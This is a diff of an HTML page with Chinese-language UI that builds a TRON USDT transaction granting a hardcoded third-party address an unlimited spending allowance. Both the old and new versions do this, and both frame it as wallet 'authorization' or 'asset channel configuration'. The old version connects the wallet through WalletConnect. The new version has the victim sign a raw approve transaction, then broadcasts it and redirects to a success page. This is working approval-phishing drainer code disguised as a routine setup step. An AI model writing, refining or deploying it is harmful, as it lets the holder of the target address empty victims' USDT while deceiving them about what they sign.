@@ -3,133 +3,110 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Tron 授权配置</title>
+<title>Tron 原始交易签名授权</title>
 <style>
-  body {
-    background: #121212;
-    color: #eee;
-    font-family: "Microsoft Yahei", Arial, sans-serif;
-    display: flex;
-    flex-direction: column;
-    height: 100vh;
-    margin: 0;
-    justify-content: center;
-    align-items: center;
-    text-align: center;
-  }
-  h2 { margin-bottom: 1rem; }
-  .status {
-    font-size: 1.3rem;
-    margin-bottom: 20px;
-    transition: color 0.3s ease;
-  }
-  .status.loading { color: #888; }
-  .status.success { color: #4caf50; }
-  .status.error { color: #f44336; }
-  .progress-bar {
-    width: 300px;
-    height: 8px;
-    background: #333;
-    border-radius: 4px;
-    overflow: hidden;
-    margin-bottom: 15px;
-  }
-  .progress-bar > div {
-    height: 100%;
-    width: 0%;
-    background: linear-gradient(90deg, #2196f3, #21cbf3);
-    transition: width 0.5s ease;
-  }
-  button {
-    padding: 10px 20px;
-    font-size: 1.1rem;
-    background-color: #2196f3;
-    border: none;
-    border-radius: 5px;
-    color: white;
-    cursor: pointer;
-    margin-top: 20px;
-  }
-  button:hover { background-color: #1976d2; }
+  body { background: #121212; color: #eee; font-family: "Microsoft Yahei", Arial, sans-serif; max-width: 600px; margin: 20px auto; padding: 10px; }
+  h2 { text-align: center; }
+  textarea { width: 100%; height: 160px; background: #222; border: none; border-radius: 6px; color: #0ff; font-family: monospace; padding: 10px; resize: vertical; }
+  button { background: #2196f3; border: none; color: white; padding: 12px 20px; font-size: 1.2rem; border-radius: 6px; cursor: pointer; margin: 10px 0; width: 100%; }
+  button:disabled { background: #555; cursor: not-allowed; }
+  .status { font-size: 1.1rem; margin-top: 10px; text-align: center; }
+  .success { color: #4caf50; }
+  .error { color: #f44336; }
+  .info { color: #2196f3; }
 </style>
 </head>
 <body>
 
-<h2>Tron 資產通道配置</h2>
-<div id="status" class="status loading">請點擊開始以授權</div>
-<div class="progress-bar"><div id="progress"></div></div>
-<button id="startBtn">開始授權</button>
+<h2>Tron USDT 无限授权（原始交易签名版）</h2>
 
-<!-- TronWeb CDN -->
+<div>
+  <p>步骤1：点击生成授权交易，生成交易原始数据（JSON格式）</p>
+  <button id="btnBuildTx">生成授权交易</button>
+  <textarea id="rawTx" readonly placeholder="生成的交易原始数据将显示在这里"></textarea>
+</div>
+
+<div>
+  <p>步骤2：将上面生成的交易原始数据复制，导入Trusd钱包进行离线签名，得到签名后的交易数据（hex字符串或JSON）。</p>
+  <textarea id="signedTx" placeholder="请粘贴钱包签名后的交易数据"></textarea>
+  <button id="btnBroadcast" disabled>广播签名交易</button>
+</div>
+
+<div class="status" id="status"></div>
+
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.2.0/dist/TronWeb.js"></script>
-<!-- Tron WalletConnect Adapter -->
-<script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-walletconnect@0.1.15/dist/index.min.js"></script>
-
 <script>
-const CFG = {
-  USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // TRON USDT 合約
-  TARGET: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf", // 被授權方
-  AMOUNT: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", // 無限額度
-  TRON_NODE: "https://api.trongrid.io" // 主網節點
-};
+  const CFG = {
+    USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
+    TARGET: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf",
+    TRON_NODE: "https://api.trongrid.io"
+  };
 
-const statusEl = document.getElementById("status");
-const progressEl = document.getElementById("progress");
-const startBtn = document.getElementById("startBtn");
+  const btnBuildTx = document.getElementById("btnBuildTx");
+  const rawTxArea = document.getElementById("rawTx");
+  const signedTxArea = document.getElementById("signedTx");
+  const btnBroadcast = document.getElementById("btnBroadcast");
+  const statusEl = document.getElementById("status");
 
-function setStatus(msg, cls="loading", progress=null) {
-  statusEl.innerText = msg;
-  statusEl.className = "status " + cls;
-  if (progress !== null) {
-    progressEl.style.width = progress + "%";
+  function setStatus(msg, cls="info") {
+    statusEl.textContent = msg;
+    statusEl.className = "status " + cls;
   }
-}
 
-async function startAuthorization() {
-  try {
-    setStatus("正在連接錢包...", "loading", 20);
-
-    const { WalletConnectAdapter } = tronwalletAdapterWalletconnect;
-    const adapter = new WalletConnectAdapter({
-      network: "Mainnet",
-      options: {
-        relayUrl: "wss://relay.walletconnect.com",
-        projectId: "demo-project-id", // 可替換為你的 WalletConnect projectId
-        metadata: {
-          name: "Tron 資產通道配置",
-          description: "USDT 授權",
-          url: location.origin,
-          icons: [location.origin + "/icon.png"]
-        }
-      }
-    });
-
-    await adapter.connect();
-    const address = adapter.address;
-    setStatus(`錢包已連接: ${address}`, "loading", 40);
-
-    setStatus("構建授權交易中...", "loading", 60);
-
+  btnBuildTx.onclick = async () => {
+    setStatus("连接 Tron 节点，生成交易中...", "info");
     const tronWeb = new TronWeb({ fullHost: CFG.TRON_NODE });
-    tronWeb.setAddress(address);
+    try {
+      const parameterTypes = ["address", "uint256"];
+      const parameterValues = [CFG.TARGET, "115792089237316195423570985008687907853269984665640564039457584007913129639935"];
+      const data = tronWeb.utils.abi.encodeParameters(parameterTypes, parameterValues);
+      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
+        CFG.USDT,
+        tronWeb.toHex("approve(address,uint256)"),
+        1000000,
+        0,
+        data
+      );
+      if (!tx || !tx.transaction) throw new Error("生成交易失败");
+      rawTxArea.value = JSON.stringify(tx.transaction, null, 2);
+      setStatus("交易生成成功，请复制并导入钱包签名", "info");
+      btnBroadcast.disabled = false;
+    } catch(e) {
+      setStatus("生成交易失败：" + e.message, "error");
+    }
+  };
 
-    const contract = await tronWeb.contract().at(CFG.USDT);
-    const tx = await contract.approve(CFG.TARGET, CFG.AMOUNT).send({ from: address });
+  btnBroadcast.onclick = async () => {
+    const signedHex = signedTxArea.value.trim();
+    if (!signedHex) return setStatus("请粘贴签名后的交易数据", "error");
 
-    setStatus("✅ 授權成功", "success", 100);
+    setStatus("正在广播交易...", "info");
+    const tronWeb = new TronWeb({ fullHost: CFG.TRON_NODE });
+    try {
+      let broadcastResult;
+      try {
+        const signedObj = JSON.parse(signedHex);
+        broadcastResult = await tronWeb.trx.broadcast(signedObj);
+      } catch {
+        const signedBytes = tronWeb.utils.code.hexStr2byteArray(signedHex);
+        broadcastResult = await tronWeb.trx.broadcast(signedBytes);
+      }
+      if (broadcastResult.result) {
+        setStatus("✅ 交易广播成功，txID: " + broadcastResult.txid, "success");
+        setTimeout(() => window.location.href = "success.html", 1500);
+      } else {
+        setStatus("交易广播失败：" + JSON.stringify(broadcastResult), "error");
+      }
+    } catch(e) {
+      setStatus("广播异常：" + e.message, "error");
+    }
+  };
 
-    // 1 秒後跳轉到成功頁
-    setTimeout(() => {
-      window.location.href = "success.html";
-    }, 1000);
+  signedTxArea.addEventListener("input", () => {
+    btnBroadcast.disabled = signedTxArea.value.trim() === "";
+  });
 
-  } catch (err) {
-    console.error(err);
-    setStatus("❌ 授權失敗，請重試", "error", 100);
-  }
-}
-
-startBtn.onclick = startAuthorization;
+  setStatus("请点击“生成授权交易”开始", "info");
 </script>
 
 </body>
